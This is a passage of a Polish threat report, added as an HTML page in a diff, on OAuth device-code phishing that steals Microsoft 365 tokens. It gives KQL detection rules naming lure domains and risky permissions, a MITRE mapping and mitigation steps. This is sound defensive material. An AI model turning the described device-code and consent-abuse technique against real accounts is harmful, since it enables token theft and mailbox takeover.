+<span class="op">|</span> <span class="fn">where</span> Permissions <span class="fn">has_any</span> (<span class="str">"Mail."</span>, <span class="str">"Files."</span>, <span class="str">"User.ReadWrite"</span>, <span class="str">"Contacts."</span>)
+<span class="op">|</span> <span class="fn">project</span> TimeGenerated, InitiatedBy, AppName, Permissions</pre></div>
+
+<p class="pr" style="margin-top:16px;"><strong>Microsoft 365 Defender - KQL: Email imitujący Teams z linkiem do workers.dev:</strong></p>
+<div class="code-wrap"><pre class="code-block"><span class="cm">// [MEDIUM] Phishing email imitujący Teams - link do Cloudflare Workers</span>
+<span class="cm">// MITRE: T1566.002</span>
+<span class="kw">EmailEvents</span>
+<span class="op">|</span> <span class="fn">where</span> TimeGenerated <span class="op">></span> <span class="fn">ago</span>(7d)
+<span class="op">|</span> <span class="fn">where</span> Subject <span class="fn">has_any</span> (<span class="str">"Teams"</span>, <span class="str">"Shared"</span>, <span class="str">"Document"</span>, <span class="str">"Workflow"</span>, <span class="str">"Review"</span>)
+<span class="op">|</span> <span class="fn">join kind=inner</span> (
+    <span class="kw">EmailUrlInfo</span>
+    <span class="op">|</span> <span class="fn">where</span> Url <span class="fn">has_any</span> (<span class="str">"workers.dev"</span>, <span class="str">"deviceauth"</span>, <span class="str">"leoch.sg"</span>)
+) <span class="fn">on</span> NetworkMessageId
+<span class="op">|</span> <span class="fn">project</span> TimeGenerated, Subject, SenderFromAddress, RecipientEmailAddress, Url, ThreatTypes</pre></div>
+
+<div class="notice cyan">
+  <div class="notice-icon">ℹ️</div>
+  <div class="notice-body"><strong>Uwaga operacyjna</strong><br>
+  Reguły KQL dla <code>SigninLogs</code> wymagają licencji <strong>Azure AD P2</strong> lub Microsoft Sentinel z odpowiednim konektorem danych. Reguła consent grant jest szczególnie wartościowa - nowe OAuth consent z szerokim zakresem uprawnień powinny zawsze wymagać manualnej weryfikacji przez zespół bezpieczeństwa.
+  </div>
+</div>
+</div>
+
+<!-- MITRE -->
+<div class="sec">
+<div class="sl">MITRE ATT&amp;CK</div>
+<div class="mg">
+  <div class="mc2"><div class="mid">T1566.002</div><div class="mname">Phishing: Spearphishing Link</div><div class="mtactic">Initial Access</div></div>
+  <div class="mc2"><div class="mid">T1528</div><div class="mname">Steal Application Access Token</div><div class="mtactic">Credential Access</div></div>
+  <div class="mc2"><div class="mid">T1550.001</div><div class="mname">Use Alternate Auth Material: Application Token</div><div class="mtactic">Defense Evasion / Lateral Movement</div></div>
+  <div class="mc2"><div class="mid">T1098.001</div><div class="mname">Account Manipulation: Additional Cloud Credentials</div><div class="mtactic">Persistence</div></div>
+  <div class="mc2"><div class="mid">T1213.002</div><div class="mname">Data from Information Repositories: SharePoint</div><div class="mtactic">Collection</div></div>
+  <div class="mc2"><div class="mid">T1584.001</div><div class="mname">Compromise Infrastructure: Domains</div><div class="mtactic">Resource Development</div></div>
+</div>
+</div>
+
+<!-- MITIGATION -->
+<div class="sec">
+<div class="sl g">Mitigacja</div>
+
+<div class="box blue">
+<strong>1. Conditional Access - ograniczenie Device Code Flow</strong><br>
+Azure AD → Security → Conditional Access → New Policy<br>
+<code>Client apps: Mobile apps and desktop clients</code> | <code>Locations: Exclude trusted</code> | <code>Grant: Block</code><br>
+Wdrożyć najpierw w trybie Report-only, zweryfikować false positive baseline przed aktywacją.
+</div>
+
+<div class="box blue">
+<strong>2. Ograniczenie zgód użytkownika (Application Consent Policies)</strong><br>
+Azure AD → Enterprise Applications → Consent and permissions<br>
+<code>User consent: Do not allow user consent</code> | <code>Admin consent requests: Enable</code><br>
+Zapobiega autoryzacji nieznanych aplikacji bez wiedzy zespołu bezpieczeństwa.
+</div>
+
+<div class="box red">
+<strong>3. Działania po kompromitacji - jeśli token został wydany</strong><br>
+<code>Revoke sessions:</code> Azure AD → Users → [User] → Revoke all refresh tokens<br>
+<code>Audit OAuth grants:</code> Enterprise Applications → przegląd ostatnich 90 dni<br>
+<code>Sprawdź reguły skrzynki:</code> Get-InboxRule -Mailbox [user] | Where {$_.ForwardTo}<br>
+<code>Sprawdź forwarding:</code> Get-Mailbox [user] | Select ForwardingAddress, ForwardingSMTPAddress
+</div>
+
+<div class="notice green">
+  <div class="notice-icon">✅</div>
+  <div class="notice-body"><strong>Wskazówka dla użytkowników</strong><br>
+  Kody urządzenia OAuth powinny pojawiać się <em>wyłącznie</em> gdy samodzielnie inicjujesz logowanie na urządzeniu bez przeglądarki. Jeśli kod pojawia się w emailu lub na stronie internetowej - to phishing. Zawsze zwróć uwagę na komunikat o <strong>lokalizacji urządzenia</strong> w panelu autoryzacji - lokalizacja inna niż twoja powinna natychmiast wzbudzić podejrzenia.
+  </div>
+</div>
+</div>
+
+<!-- REFERENCES -->
+<div class="sec">
+<div class="sl c">Referencje</div>
+<table class="it">
+  <thead><tr><th>Źródło</th><th>Link</th></tr></thead>
+  <tbody>
+    <tr><td>RFC 8628</td><td><span class="ioc-d">datatracker.ietf.org/doc/html/rfc8628 - OAuth 2.0 Device Authorization Grant</span></td></tr>
+    <tr><td>Microsoft Docs</td><td><span class="ioc-d">learn.microsoft.com - OAuth 2.0 device authorization grant flow in Microsoft identity platform</span></td></tr>
+    <tr><td>MITRE ATT&CK</td><td><span class="ioc-d">attack.mitre.org/techniques/T1528 - Steal Application Access Token</span></td></tr>
+    <tr><td>Microsoft Security Blog</td><td><span class="ioc-d">microsoft.com/security/blog - From cookie theft to BEC: AiTM phishing sites as entry point</span></td></tr>
+    <tr><td>Zgłoszenie CERT</td><td><span class="ioc-d">incydent.cert.pl - zgłoszenie infrastruktury phishingowej</span></td></tr>
+  </tbody>
+</table>
+</div>
+
+<footer>
+  <span>// THREAT-012 · OAuth Device Code Phishing · Microsoft 365 Token Theft · 21 Apr 2026</span>
+  <span>Phishing Analysis · Microsoft Sentinel · Entra ID</span>
+</footer>
+
+</div>
+</body>
+</html>
